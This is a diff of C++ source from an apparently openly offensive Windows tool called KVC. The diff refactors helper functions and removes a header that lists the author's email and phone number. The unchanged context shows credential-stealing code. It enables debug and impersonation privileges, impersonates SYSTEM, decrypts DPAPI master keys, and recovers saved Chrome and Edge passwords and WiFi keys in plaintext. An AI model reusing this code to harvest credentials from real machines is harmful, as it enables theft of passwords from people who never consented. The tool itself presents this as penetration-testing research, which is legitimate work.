@@ -1,28 +1,3 @@
-/*******************************************************************************
-  _  ____     ______ 
- | |/ /\ \   / / ___|
- | ' /  \ \ / / |    
- | . \   \ V /| |___ 
- |_|\_\   \_/  \____|
-
-The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
-offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
-as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
-of kernel-level primitives** for legitimate security research and penetration testing.
-
-KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
-security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
-Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
-that define these protections.
-
-  -----------------------------------------------------------------------------
-  Author : Marek Wesołowski
-  Email  : marek@wesolowski.eu.org
-  Phone  : +48 607 440 283 (Tel/WhatsApp)
-  Date   : 04-09-2025
-
-*******************************************************************************/
-
 #include "Controller.h"
 #include "ReportExporter.h"
 #include "common.h"
@@ -47,27 +22,6 @@ extern volatile bool g_interrupted;
 
 // SQLite constants for winsqlite3.dll compatibility
 constexpr int SQLITE_OPEN_READONLY = 0x00000001;
-
-// UTF-8 string conversion utilities for DPAPI operations
-std::wstring StringToWString(const std::string& str) noexcept 
-{
-    if (str.empty()) return L"";
-    
-    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.data(), static_cast<int>(str.size()), nullptr, 0);
-    std::wstring result(size_needed, 0);
-    MultiByteToWideChar(CP_UTF8, 0, str.data(), static_cast<int>(str.size()), result.data(), size_needed);
-    return result;
-}
-
-std::string WStringToString(const std::wstring& wstr) noexcept 
-{
-    if (wstr.empty()) return "";
-    
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), nullptr, 0, nullptr, nullptr);
-    std::string result(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), result.data(), size_needed, nullptr, nullptr);
-    return result;
-}
 
 // Main DPAPI password extraction interface
 bool Controller::ShowPasswords(const std::wstring& outputPath) noexcept 
@@ -180,18 +134,18 @@ bool Controller::PerformPasswordExtractionInit() noexcept
         return false;
     }
     
-    if (!EnablePrivilege(L"SeDebugPrivilege")) {
+    if (!PrivilegeUtils::EnablePrivilege(L"SeDebugPrivilege")) {
         ERROR(L"CRITICAL: Failed to enable SeDebugPrivilege");
         return false;
     }
     
-    if (!EnablePrivilege(L"SeImpersonatePrivilege")) {
+    if (!PrivilegeUtils::EnablePrivilege(L"SeImpersonatePrivilege")) {
         ERROR(L"CRITICAL: Failed to enable SeImpersonatePrivilege");
         return false;
     }
     
-    EnablePrivilege(L"SeBackupPrivilege");
-    EnablePrivilege(L"SeRestorePrivilege");
+    PrivilegeUtils::EnablePrivilege(L"SeBackupPrivilege");
+    PrivilegeUtils::EnablePrivilege(L"SeRestorePrivilege");
     
     if (!m_trustedInstaller.PublicImpersonateSystem()) {
         ERROR(L"Failed to impersonate SYSTEM: %d", GetLastError());
@@ -477,21 +431,6 @@ bool Controller::ProcessRegistryMasterKeys(std::vector<RegistryMasterKey>& maste
     return !masterKeys.empty();
 }
 
-// Convert byte vector to hex string for display
-std::string Controller::BytesToHexString(const std::vector<BYTE>& bytes) noexcept 
-{
-    if (bytes.empty()) return "";
-    
-    std::ostringstream hexStream;
-    hexStream << std::hex << std::setfill('0');
-    
-    for (const auto& byte : bytes) {
-        hexStream << std::setw(2) << static_cast<int>(byte);
-    }
-    
-    return hexStream.str();
-}
-
 // Process browser passwords with master key decryption
 bool Controller::ProcessBrowserPasswords(const std::vector<RegistryMasterKey>& masterKeys,
                                         std::vector<PasswordResult>& results,
@@ -506,7 +445,7 @@ bool Controller::ProcessBrowserPasswords(const std::vector<RegistryMasterKey>& m
     std::string localAppDataA(appData);
     free(appData);
     
-    std::wstring localAppData = StringToWString(localAppDataA);
+    std::wstring localAppData = StringUtils::UTF8ToWide(localAppDataA);
     auto edgePath = localAppData + DPAPIConstants::GetEdgeUserData();
     
     bool edgeSuccess = ProcessSingleBrowser(edgePath, L"Edge", masterKeys, results, outputPath);
@@ -589,7 +528,7 @@ bool Controller::ExtractBrowserMasterKey(const std::wstring& browserPath,
     
     std::string encryptedKeyBase64 = content.substr(startQuote + 1, endQuote - startQuote - 1);
     
-    std::vector<BYTE> encryptedKeyBytes = Base64Decode(encryptedKeyBase64);
+    std::vector<BYTE> encryptedKeyBytes = CryptoUtils::Base64Decode(encryptedKeyBase64);
     if (encryptedKeyBytes.empty()) {
         ERROR(L"Failed to decode base64 master key");
         return false;
@@ -631,7 +570,7 @@ int Controller::ProcessLoginDatabase(const std::wstring& loginDataPath,
     }
     
     void* db;
-    std::string tempDbPathA = WStringToString(tempDbPath);
+    std::string tempDbPathA = StringUtils::WideToUTF8(tempDbPath);
     
     if (m_sqlite.open_v2(tempDbPathA.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != 0) {
         ERROR(L"Failed to open SQLite database: %s", tempDbPath.c_str());
@@ -660,11 +599,11 @@ int Controller::ProcessLoginDatabase(const std::wstring& loginDataPath,
         result.profile = profileName;
         
         if (auto urlText = m_sqlite.column_text(stmt, 0)) {
-            result.url = StringToWString(reinterpret_cast<const char*>(urlText));
+            result.url = StringUtils::UTF8ToWide(reinterpret_cast<const char*>(urlText));
         }
         
         if (auto usernameText = m_sqlite.column_text(stmt, 1)) {
-            result.username = StringToWString(reinterpret_cast<const char*>(usernameText));
+            result.username = StringUtils::UTF8ToWide(reinterpret_cast<const char*>(usernameText));
         }
         
         const BYTE* pwdBytes = static_cast<const BYTE*>(m_sqlite.column_blob(stmt, 2));
@@ -673,7 +612,7 @@ int Controller::ProcessLoginDatabase(const std::wstring& loginDataPath,
         if (pwdBytes && pwdSize > 0) {
             std::vector<BYTE> encryptedPwd(pwdBytes, pwdBytes + pwdSize);
             std::string decryptedPwd = DecryptChromeAESGCM(encryptedPwd, masterKey);
-            result.password = StringToWString(decryptedPwd);
+            result.password = StringUtils::UTF8ToWide(decryptedPwd);
             result.status = DPAPIConstants::GetStatusDecrypted();
             
             results.push_back(result);
@@ -755,8 +694,8 @@ bool Controller::ExtractWiFiCredentials(std::vector<PasswordResult>& results) no
                 if (!password.empty()) {
                     PasswordResult wifiResult;
                     wifiResult.type = L"WiFi";
-                    wifiResult.profile = StringToWString(profile);
-                    wifiResult.password = StringToWString(password);
+                    wifiResult.profile = StringUtils::UTF8ToWide(profile);
+                    wifiResult.password = StringUtils::UTF8ToWide(password);
                     wifiResult.status = DPAPIConstants::GetStatusDecrypted();
                     results.push_back(wifiResult);
                 }
@@ -821,24 +760,6 @@ void Controller::UnloadSQLiteLibrary() noexcept
         FreeLibrary(m_sqlite.hModule);
         m_sqlite.hModule = nullptr;
     }
-}
-
-// Base64 decode using Windows CryptAPI
-std::vector<BYTE> Controller::Base64Decode(const std::string& encoded) noexcept 
-{
-    DWORD decodedSize = 0;
-    
-    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr)) {
-        return {};
-    }
-    
-    std::vector<BYTE> decoded(decodedSize);
-    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &decodedSize, nullptr, nullptr)) {
-        return {};
-    }
-    
-    decoded.resize(decodedSize);
-    return decoded;
 }
 
 // DPAPI decryption for browser master keys
@@ -919,31 +840,6 @@ std::string Controller::DecryptChromeAESGCM(const std::vector<BYTE>& encryptedDa
     
     // Fallback for legacy formats
     return std::string(encryptedData.begin(), encryptedData.end());
-}
-
-bool Controller::EnablePrivilege(LPCWSTR privilegeName) noexcept 
-{
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        return false;
-    }
-
-    LUID luid;
-    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) {
-        CloseHandle(hToken);
-        return false;
-    }
-
-    TOKEN_PRIVILEGES tp = {};
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
-    DWORD lastError = GetLastError();
-    CloseHandle(hToken);
-    
-    return result && (lastError == ERROR_SUCCESS);
 }
 
 // Browser data extraction with kvc_pass integration
